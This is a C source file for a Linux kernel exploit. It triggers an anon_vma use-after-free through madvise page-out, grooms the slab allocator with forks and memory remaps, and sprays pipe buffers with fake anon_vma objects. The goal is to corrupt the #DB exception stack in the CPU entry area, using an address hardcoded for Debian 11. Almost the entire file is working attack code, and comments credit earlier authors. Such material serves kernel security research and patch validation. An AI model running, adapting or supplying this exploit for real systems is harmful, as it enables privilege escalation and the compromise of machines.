#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <err.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/eventfd.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <linux/membarrier.h>
#include <stddef.h>
#include "hbp_fire.h"
#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

int fork_sameparent(void) {
  return syscall(__NR_clone, SIGCHLD|CLONE_PARENT, NULL, NULL, NULL, 0);
}

// tell the scheduler to pin a task to a specific CPU core
static void pin_task_to(int pid, int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  SYSCHK(sched_setaffinity(pid, sizeof(cpu_set_t), &cset));
}
static void pin_to(int cpu) { pin_task_to(0, cpu); }

struct anon_vma {
/* 0*/  unsigned long root;
        struct {
/* 8*/    unsigned long counter;
/*16*/    unsigned long owner;
/*24*/    unsigned int osq;
/*28*/    unsigned int wait_lock;
/*32*/    unsigned long wait_list[2];
        } rwsem;
/*48*/  int refcount;
/*52*/  int degree;
/*56*/  unsigned long parent;
        struct {
/*64*/    unsigned long rb_node;
/*72*/    unsigned long rb_leftmost;
        } rb_root;
/*80*/  unsigned long slub_freeptr; /* out of line for typesafe-by-RCU slab */
};

#define PAGE_SIZE 0x1000UL
#define NUM_HOLEFILL_SPAM 8000UL
#define SLAB_SIZE (sizeof(struct anon_vma))
#define OBJS_PER_SLAB (PAGE_SIZE / SLAB_SIZE)
#define NUM_CPU_PARTIAL 30UL
#define NUM_FREELIST_SPAM (OBJS_PER_SLAB * NUM_CPU_PARTIAL)
#define NUM_PREFILL (OBJS_PER_SLAB - 1)
#define NUM_POSTFILL (OBJS_PER_SLAB)

#define HOLEFILL_ADDR ((char*)0x100000UL)
#define HOLEFILL_REGION_SIZE (NUM_HOLEFILL_SPAM * PAGE_SIZE)
#define FREELIST_SPAM_ADDR (HOLEFILL_ADDR + HOLEFILL_REGION_SIZE)
#define FREELIST_SPAM_REGION_SIZE (NUM_FREELIST_SPAM * PAGE_SIZE)
#define MERGE_VMA_REGION_ADDR (FREELIST_SPAM_ADDR + FREELIST_SPAM_REGION_SIZE)
#define MERGE_VMA_REGION_SIZE (5 * PAGE_SIZE)
#define MERGE_VMA_ADDR (MERGE_VMA_REGION_ADDR + PAGE_SIZE)
#define VICTIM_VMA_ADDR (MERGE_VMA_REGION_ADDR + 3*PAGE_SIZE)
#define PREFILL_ADDR (MERGE_VMA_REGION_ADDR + MERGE_VMA_REGION_SIZE)
#define PREFILL_REGION_SIZE (NUM_PREFILL * PAGE_SIZE)
#define VICTIM_VMA_COPY_ADDR (PREFILL_ADDR + PREFILL_REGION_SIZE)
#define POSTFILL_ADDR (VICTIM_VMA_COPY_ADDR + PAGE_SIZE)
#define POSTFILL_REGION_SIZE (NUM_POSTFILL*PAGE_SIZE)
#define END_ADDR (POSTFILL_ADDR + POSTFILL_REGION_SIZE)

struct cpu_entry_area {
	char                       gdt[4096];
	struct entry_stack_page {
		struct entry_stack {
			char       stack[4096];
		} stack;
	} entry_stack_page __attribute__((__aligned__(4096)));
	struct tss_struct {
		struct x86_hw_tss {
			 unsigned int reserved1;
			 long long unsigned int sp0;
			 long long unsigned int sp1;
			 long long unsigned int sp2;
			 long long unsigned int reserved2;
			 long long unsigned int ist[7];
			 unsigned int reserved3;
			 unsigned int reserved4;
			 short unsigned int reserved5;
			 short unsigned int io_bitmap_base;
		} __attribute__((__packed__)) x86_tss;
		struct x86_io_bitmap {
			 long long unsigned int prev_sequence;
			unsigned int prev_max;
			long unsigned int bitmap[1025];
			long unsigned int mapall[1025];
		} io_bitmap;
	} tss __attribute__((__aligned__(4096)));
	struct cea_exception_stacks {
		char               DF_stack_guard[4096];
		char               DF_stack[4096];
		char               NMI_stack_guard[4096];
		char               NMI_stack[4096];
		char               DB_stack_guard[4096];
		char               DB_stack[4096];
		char               MCE_stack_guard[4096];
		char               MCE_stack[4096];
		char               VC_stack_guard[4096];
		char               VC_stack[4096];
		char               VC2_stack_guard[4096];
		char               VC2_stack[4096];
		char               IST_top_guard[4096];
	} estacks;
	struct debug_store {
		 long long unsigned int bts_buffer_base;
		 long long unsigned int bts_index;
		 long long unsigned int bts_absolute_maximum;
		 long long unsigned int bts_interrupt_threshold;
		 long long unsigned int pebs_buffer_base;
		 long long unsigned int pebs_index;
		 long long unsigned int pebs_absolute_maximum;
		 long long unsigned int pebs_interrupt_threshold;
		 long long unsigned int pebs_event_reset[12];
	} cpu_debug_store __attribute__((__aligned__(4096)));
	struct debug_store_buffers {
		char               bts_buffer[65536];
		char               pebs_buffer[65536];
	} cpu_debug_buffers;
} __attribute__((__aligned__(4096)));
#define __AC(X,Y)	(X##Y)
#define _AC(X,Y)	__AC(X,Y)
#define CPU_ENTRY_AREA_PGD	_AC(-4, UL)
#define P4D_SHIFT 39
#define CPU_ENTRY_AREA_BASE	(CPU_ENTRY_AREA_PGD << P4D_SHIFT)

struct cpu_entry_area *cea_by_cpu(int cpu) {
  return ((struct cpu_entry_area *)CPU_ENTRY_AREA_BASE) + cpu;
}

void dump_layout(const char *label) {
  printf("<<<<<<<<<< %s >>>>>>>>>>\n", label);
  // | grep -B10000 '10f000-' 
  //system("cat /proc/$PPID/smaps | grep -v ' kB$'");
  printf("\n\n\n");
}

#define NUM_PIPES 60
int pipefds[NUM_PIPES][2];

void trigger_anonvma_uaf(void) {
  SYSCHK(madvise(VICTIM_VMA_ADDR, PAGE_SIZE, 21/*MADV_PAGEOUT*/));
}

// spray pipe with fake anon_vmas
void replace_pipe_contents(int *fds, unsigned long fake_root) {
  char buf[PAGE_SIZE];
  SYSCHK(read(fds[0], buf, PAGE_SIZE));
  struct anon_vma dummy_anon_vma = {
    .root = fake_root
  };
  for (int i=0; i<OBJS_PER_SLAB; i++) {
    ((struct anon_vma *)buf)[i] = dummy_anon_vma;
  }
  SYSCHK(write(fds[1], buf, PAGE_SIZE));
}

/*void post_setup(void) {
  printf("anon_vma setup done, starting post-setup exploit\n");

  char *db_stack_start = cea_by_cpu(1)->estacks.DB_stack;
  printf("cpu 1 #DB stack starts at %p (and hopefully that memory is currently all zero)\n", db_stack_start);
  printf("sleeping 10s (to make sure nothing crashes before you can read the screen)...\n");
  sleep(10);
  printf("triggering uaf three times with ->root pointing to zeroed memory\n");
  for (int j=0; j<NUM_PIPES; j++) {
    replace_pipe_contents(pipefds[j], (unsigned long)db_stack_start);
  }
  for (int i=0; i<3; i++)
    trigger_anonvma_uaf();
  printf("sleeping 1s...\n");
  sleep(1);
  printf("triggering uaf with ->root pointing to inaccessible memory, with page reuse index encoded in crash address\n");
  for (int j=0; j<NUM_PIPES; j++) {
    replace_pipe_contents(pipefds[j], 0xbad00000000UL + 0x10000*j);
  }
  trigger_anonvma_uaf();
}*/
// ^^ orig post_setup from Jann

static inline unsigned long fixup_root(unsigned long val) {
  return val - (offsetof(struct anon_vma, rwsem.counter));
}
void post_setup(void) {
  //const unsigned long rcx_loc = 0xfffffe0000042fb0;
  const unsigned long rcx_loc = 0xfffffe000004bfb0; //Debian 11
  unsigned long desired_byte_write = rcx_loc + 3;
  printf("anon_vma setup done, starting post-setup exploit\n");

  char *db_stack_start = cea_by_cpu(1)->estacks.DB_stack;
  printf("cpu 1 #DB stack starts at %p\nsleeping 2 sec\n", db_stack_start);
  printf("clobbering stack\n");
  for (int j=0; j<NUM_PIPES; j++) {
    replace_pipe_contents(pipefds[j], (unsigned long)fixup_root(desired_byte_write));
    //replace_pipe_contents(pipefds[j], (unsigned long)fixup_root(0xffffffff41414141));
  }
  while(!map[392])
    trigger_anonvma_uaf();
  puts("Swapping to aligned rcx location - replacing buffer contents");
  for(int j=0; j<NUM_PIPES; j++) {
    replace_pipe_contents(pipefds[j], (unsigned long)fixup_root(desired_byte_write) -  3);
  }   
  while(1)
    trigger_anonvma_uaf();
}
struct {
  int child2;
  int child3;
  int child4;
  int child5;
} *shm_page;

#if 0
/* make the VFS call synchronize_rcu_expedited() */
void rcu_flush() {
  SYSCHK(mount("/dev/shm", "/dev/shm", NULL, MS_BIND, NULL));
  SYSCHK(umount("/dev/shm"));
}
#else
void rcu_flush(void) {
  printf("rcu_flush(): begin membarrier to wait for call_rcu()\n");
  SYSCHK(syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, 0));
  printf("rcu_flush(): membarrier over\n");
}
#endif

int main(void) {
  map = mmap((void*) 0x0a000000,0x1000000,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,0,0);

  /* Normally I would rather fork and initialize all this later along with properly racing the PTRACE_CONT'd task from within the main exploit task
   * but for reasons that I didn't debug all the way, forking and/or mmap'ing later on breaks the uaf so just get it out of the way now.
   * the main exploit task will be performing the memory corruption. hbp_exploit() will use it --sjenkins
   */
  switch(fork())
  {
    case 0:
    exit(hbp_exploit());
    case -1:
    printf("Failed to fork: %m\n");
    return 1;
  }
  //default case fallthrough
  sync();
  pin_to(0);
  setbuf(stdout, NULL);
  system("cat /proc/$PPID/comm");

  int status;
  eventfd_t dummy_event;

  shm_page = SYSCHK(mmap(NULL, sizeof(*shm_page), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0));

  int evfd = SYSCHK(eventfd(0, EFD_SEMAPHORE));
  int evfd_trigger_leaf_release = SYSCHK(eventfd(0, EFD_SEMAPHORE));
  int evfd_signal_leaf_ready = SYSCHK(eventfd(0, EFD_SEMAPHORE));
  int evfd_setup_done = SYSCHK(eventfd(0, EFD_SEMAPHORE));

  SYSCHK(mmap(MERGE_VMA_ADDR, 3*PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED_NOREPLACE, -1, 0));
  *MERGE_VMA_ADDR = 1; /* alloc root */

  int child1 = SYSCHK(fork()); /* alloc reuse-mid */
  if (child1 == 0) {
    int child2 = SYSCHK(fork_sameparent()); /* alloc reuse-leaf */
    if (child2 == 0) {
      SYSCHK(eventfd_read(evfd, &dummy_event)); /* AWAIT reuse-mid exit */
      int child3 = SYSCHK(fork_sameparent()); /* reuse reuse-mid */
      if (child3 == 0) {
        SYSCHK(eventfd_read(evfd_signal_leaf_ready, &dummy_event));

        // setup all the crap for slub manipulation - minimal allocation here,
        // but fork() will give each of these single-page VMAs a dedicated
        // anon_vma.
        SYSCHK(mmap(HOLEFILL_ADDR, HOLEFILL_REGION_SIZE+FREELIST_SPAM_REGION_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0));
        *HOLEFILL_ADDR = 1;
        for (int i=0; i<HOLEFILL_REGION_SIZE+FREELIST_SPAM_REGION_SIZE; i += 2*PAGE_SIZE)
          SYSCHK(mprotect(HOLEFILL_ADDR+i, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC));
        SYSCHK(mmap(PREFILL_ADDR, PREFILL_REGION_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0));
        *PREFILL_ADDR = 1;
        for (int i=0; i<PREFILL_REGION_SIZE; i += 2*PAGE_SIZE)
          SYSCHK(mprotect(PREFILL_ADDR+i, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC));
        SYSCHK(mmap(POSTFILL_ADDR, POSTFILL_REGION_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0));
        *POSTFILL_ADDR = 1;
        for (int i=0; i<POSTFILL_REGION_SIZE; i += 2*PAGE_SIZE)
          SYSCHK(mprotect(POSTFILL_ADDR+i, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC));

        dump_layout("reusing reuse-mid");
        // move the victim VMA over between the pre-fill and the post-fill VMAs.
        SYSCHK(mremap(VICTIM_VMA_ADDR, PAGE_SIZE, PAGE_SIZE, MREMAP_MAYMOVE|MREMAP_FIXED, VICTIM_VMA_COPY_ADDR)); /* split reuse-mid */
        dump_layout("split reuse-mid");

        /*
         * allocate anon_vmas:
         *  - ...
         *  - holefill
         *  - freelist-spam
         *  - fork-A
         *  - pre-fill
         *  - fork-B(VICTIM)
         *  - post-fill
         *  - ...
         */
        int child4 = SYSCHK(fork_sameparent());
        if (child4 == 0) {
          dump_layout("allocated fork-A, fork-B");
          *VICTIM_VMA_COPY_ADDR = 1; /* <<< this page will lose its anonvma */
          SYSCHK(eventfd_write(evfd_trigger_leaf_release, 1));
          SYSCHK(eventfd_read(evfd, &dummy_event)); /* AWAIT reuse-leaf exit */
          dump_layout("fork-A and fork-B, reuse-leaf should be released");
          /* lots more allocations that we don't need in this step, oh well */
          int child5 = SYSCHK(fork_sameparent());
          if (child5 == 0) {
            dump_layout("should now be reusing reuse-leaf for both?");
            shm_page->child5 = getpid();
            SYSCHK(eventfd_write(evfd_setup_done, 1000));
            SYSCHK(eventfd_read(evfd, &dummy_event)); /* AWAIT setup done */

            /* child4 has exited, we're the only process left holding references
             * to the anon_vmas created in the creation of child4.
             */

            for (int i=0; i<NUM_PIPES; i++) {
              SYSCHK(pipe(pipefds[i]));
              SYSCHK(fcntl(pipefds[i][0], F_SETPIPE_SZ, PAGE_SIZE));
            }
            unsigned long dummy_data[PAGE_SIZE/sizeof(long)];
            for (int i=0; i<PAGE_SIZE/sizeof(long); i++)
              dummy_data[i] = 0x12300badbeef;

            /* for rcu_flush() */
            //SYSCHK(unshare(CLONE_NEWUSER|CLONE_NEWNS));

            rcu_flush();
            /* free victim VMA and everything around it */
            SYSCHK(mremap(VICTIM_VMA_COPY_ADDR, PAGE_SIZE, PAGE_SIZE, MREMAP_MAYMOVE|MREMAP_FIXED, VICTIM_VMA_ADDR));
            SYSCHK(munmap(PREFILL_ADDR, PREFILL_REGION_SIZE));
            SYSCHK(munmap(POSTFILL_ADDR, POSTFILL_REGION_SIZE));
            /* flush SLUB percpu freelist */
            for (int i=0; i<NUM_CPU_PARTIAL; i++)
              SYSCHK(munmap(FREELIST_SPAM_ADDR + i * OBJS_PER_SLAB * PAGE_SIZE, PAGE_SIZE));
            rcu_flush(); /* flush page from RCU to page allocator */

            /* try to reallocate page */
            for (int i=0; i<NUM_PIPES; i++) {
              SYSCHK(write(pipefds[i][1], dummy_data, PAGE_SIZE));
            }

            dump_layout("should have merged?");
            post_setup();
            exit(0);
          }
          exit(0);
        }
        shm_page->child4 = child4;
        SYSCHK(eventfd_read(evfd_setup_done, &dummy_event));
        exit(0);
      }
      shm_page->child3 = child3;
      /* bump reuse-leaf degree from 1 to 2 */
      SYSCHK(mprotect(MERGE_VMA_ADDR, PAGE_SIZE, PROT_NONE));
      SYSCHK(eventfd_write(evfd_signal_leaf_ready, 1));
      SYSCHK(eventfd_read(evfd_trigger_leaf_release, &dummy_event));
      exit(0); /* reuse-leaf exit */
    }
    shm_page->child2 = child2;
    exit(0); /* reuse-mid exit */
  }
  SYSCHK(waitpid(child1, &status, 0)); /* notice reuse-mid exit */
  SYSCHK(eventfd_write(evfd, 1)); /* SIGNAL reuse-mid exit */
  SYSCHK(waitpid(shm_page->child2, &status, 0)); /* unuse anon_vma 2 */
  SYSCHK(eventfd_write(evfd, 1)); /* SIGNAL B */

  SYSCHK(eventfd_read(evfd_setup_done, &dummy_event));
  SYSCHK(waitpid(shm_page->child3, &status, 0)); /* wait for stuff to exit */
  SYSCHK(waitpid(shm_page->child4, &status, 0)); /* wait for stuff to exit */
  SYSCHK(eventfd_write(evfd, 1)); /* SETUP DONE */
  SYSCHK(waitpid(shm_page->child5, &status, 0)); /* wait for main exploit task */
  return 0;
}
